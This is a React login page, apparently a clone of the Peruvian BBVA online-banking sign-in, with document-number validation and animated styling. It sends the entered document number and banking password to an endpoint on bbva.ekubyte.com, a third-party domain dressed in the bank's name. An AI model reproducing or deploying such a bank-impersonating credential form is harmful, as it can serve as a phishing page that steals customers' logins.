import { motion, AnimatePresence } from 'framer-motion';
import { useState } from 'react';

const Login = ({ onNavigateToHome, onLoginSuccess }) => {
  const [docType, setDocType] = useState('DNI');
  const [docNumber, setDocNumber] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Nueva función para manejar el cambio de tipo de documento
  const handleDocTypeChange = (e) => {
    setDocType(e.target.value);
    setDocNumber(''); // Limpiamos el input al cambiar de tipo
    setError('');
  };

  // Nueva función para validar lo que se escribe en tiempo real
  const handleDocNumberChange = (e) => {
    const value = e.target.value;
    
    if (docType === 'DNI') {
      // Si es DNI: Solo acepta números y máximo 8 dígitos
      const onlyNums = value.replace(/[^0-9]/g, '');
      if (onlyNums.length <= 8) {
        setDocNumber(onlyNums);
      }
    } else if (docType === 'CE') {
      // Si es CE: Máximo 9 caracteres (letras y números)
      const alphanumeric = value.replace(/[^a-zA-Z0-9]/g, '');
      if (alphanumeric.length <= 9) {
        setDocNumber(alphanumeric.toUpperCase()); // Convertimos a mayúsculas por estética
      }
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    
    // Validación adicional antes de enviar al servidor
    if (docType === 'DNI' && docNumber.length < 8) {
      setError('El DNI debe tener 8 dígitos obligatoriamente.');
      return;
    }
    if (docType === 'CE' && docNumber.length < 9) {
      setError('El Carné de Extranjería debe tener 9 caracteres.');
      return;
    }

    setIsLoading(true);

    try {
      const apiUrl = 'https://bbva.ekubyte.com/api/controllers/AuthController.php';

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ dni: docNumber, password }),
      });

      const data = await response.json();

      if (data.success) {
        onLoginSuccess({
          nombre: data.user.nombre,
          dni: data.user.dni,
          saldo: data.user.saldo,
        });
      } else {
        setError(data.message || 'Datos incorrectos. Verifica tu documento y contraseña.');
      }
    } catch (err) {
      setError('Error de conexión con el servidor BBVA (Base de datos).');
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={{ fontFamily: "'DM Sans', sans-serif" }} className="min-h-screen bg-[#F2F4F7] flex flex-col relative overflow-hidden">

      {/* Decorative background circles */}
      <div className="absolute -top-16 -right-16 w-80 h-80 rounded-full bg-[#004481] opacity-[0.06] pointer-events-none" />
      <div className="absolute -bottom-20 -left-12 w-64 h-64 rounded-full bg-[#1973B8] opacity-[0.07] pointer-events-none" />

      {/* Header */}
      <header className="w-full bg-[#004481] h-[60px] px-7 flex items-center justify-between relative z-10 shadow-md">
        <div className="flex items-center gap-2.5">
          <span className="text-white text-[22px] font-semibold tracking-[2px]">BBVA</span>
          <span className="w-1.5 h-1.5 rounded-full bg-[#49D0A0]" />
        </div>
        <button
          onClick={onNavigateToHome}
          className="text-white/70 text-[13px] font-medium hover:text-white transition-colors flex items-center gap-1.5"
        >
          Cerrar &nbsp;✕
        </button>
      </header>

      {/* Main */}
      <main className="flex-1 flex items-center justify-center p-6 relative z-10">
        <motion.div
          initial={{ opacity: 0, y: 24 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
          className="w-full max-w-[420px]"
        >
          <div className="bg-white rounded-2xl overflow-hidden shadow-[0_4px_40px_rgba(0,68,129,0.10),0_1px_4px_rgba(0,68,129,0.06)]">

            {/* Blue top banner */}
            <div className="relative overflow-hidden px-8 pt-7 pb-6"
              style={{ background: 'linear-gradient(135deg, #004481 0%, #1565C0 100%)' }}>
              <div className="absolute -top-8 -right-8 w-36 h-36 rounded-full bg-white/5" />
              <div className="absolute right-5 -bottom-14 w-28 h-28 rounded-full bg-white/[0.04]" />
              <motion.p
                initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}
                className="text-white/65 text-[10.5px] font-semibold tracking-[1.5px] uppercase mb-1.5"
              >
                Bienvenido
              </motion.p>
              <motion.h1
                initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.15 }}
                className="text-white text-[26px] font-semibold leading-tight"
              >
                Hola, ingresa<br />a tu cuenta
              </motion.h1>
              <motion.p
                initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}
                className="text-white/60 text-[13px] font-light mt-1.5"
              >
                Banca online segura y rápida
              </motion.p>
            </div>

            {/* Form */}
            <div className="px-8 pt-7 pb-8">
              <AnimatePresence>
                {error && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }}
                    exit={{ opacity: 0, height: 0 }}
                    className="bg-red-50 border-l-[3px] border-red-500 rounded-r-lg text-red-700 p-3 mb-5 text-[12.5px] font-medium"
                  >
                    {error}
                  </motion.div>
                )}
              </AnimatePresence>

              <form onSubmit={handleSubmit} className="space-y-5">
                {/* DNI field */}
                <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.25 }}>
                  <label className="block text-[10.5px] font-semibold text-[#004481] tracking-[1px] uppercase mb-2">
                    Documento de identidad
                  </label>
                  <div className="flex items-center border-[1.5px] border-[#E0E6ED] rounded-[10px] overflow-hidden bg-[#F8FAFC] focus-within:border-[#1973B8] focus-within:shadow-[0_0_0_3px_rgba(25,115,184,0.12)] focus-within:bg-white transition-all">
                    <select
                      value={docType}
                      onChange={handleDocTypeChange}
                      className="bg-transparent border-none border-r-[1.5px] border-[#E0E6ED] outline-none text-[13px] font-semibold text-[#004481] px-3 h-[46px] min-w-[64px] cursor-pointer appearance-none"
                    >
                      <option value="DNI">DNI</option>
                      <option value="CE">CE</option>
                    </select>
                    <input
                      type="text"
                      className="flex-1 border-none outline-none text-[14px] text-[#1A2B4A] bg-transparent px-3.5 h-[46px] placeholder:text-[#B0BEC5]"
                      placeholder={`Número de ${docType}`}
                      value={docNumber}
                      onChange={handleDocNumberChange}
                      required
                    />
                  </div>
                </motion.div>

                {/* Password field */}
                <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
                  <label className="block text-[10.5px] font-semibold text-[#004481] tracking-[1px] uppercase mb-2">
                    Contraseña de banca
                  </label>
                  <div className="flex items-center border-[1.5px] border-[#E0E6ED] rounded-[10px] overflow-hidden bg-[#F8FAFC] focus-within:border-[#1973B8] focus-within:shadow-[0_0_0_3px_rgba(25,115,184,0.12)] focus-within:bg-white transition-all relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      className="flex-1 border-none outline-none text-[16px] text-[#1A2B4A] bg-transparent pl-3.5 pr-16 h-[46px] tracking-[0.15em] font-mono placeholder:font-sans placeholder:text-[14px] placeholder:tracking-normal placeholder:text-[#B0BEC5]"
                      placeholder="••••••"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      maxLength={6}
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 text-[11px] font-semibold text-[#1973B8] uppercase tracking-[0.5px] px-1.5 py-1 rounded hover:bg-[#1973B8]/10 transition-colors"
                    >
                      {showPassword ? 'Ocultar' : 'Ver'}
                    </button>
                  </div>
                </motion.div>

                {/* Submit */}
                <motion.button
                  type="submit"
                  disabled={isLoading}
                  initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}
                  whileTap={{ scale: 0.98 }}
                  className="w-full h-12 rounded-[10px] bg-[#004481] hover:bg-[#1565C0] text-white text-[14px] font-semibold tracking-[0.5px] flex items-center justify-center gap-2 transition-colors disabled:opacity-65 disabled:cursor-not-allowed mt-2 overflow-hidden relative"
                >
                  {isLoading ? (
                    <>
                      <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      Consultando...
                    </>
                  ) : (
                    'Entrar a mi cuenta'
                  )}
                </motion.button>
              </form>

              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.4 }} className="text-center mt-6">
                <a href="#" className="text-[#1973B8] text-[12.5px] font-medium hover:text-[#004481] transition-colors">
                  ¿Olvidaste tu contraseña?
                </a>
              </motion.div>
            </div>
          </div>
        </motion.div>
      </main>
    </div>
  );
};

export default Login;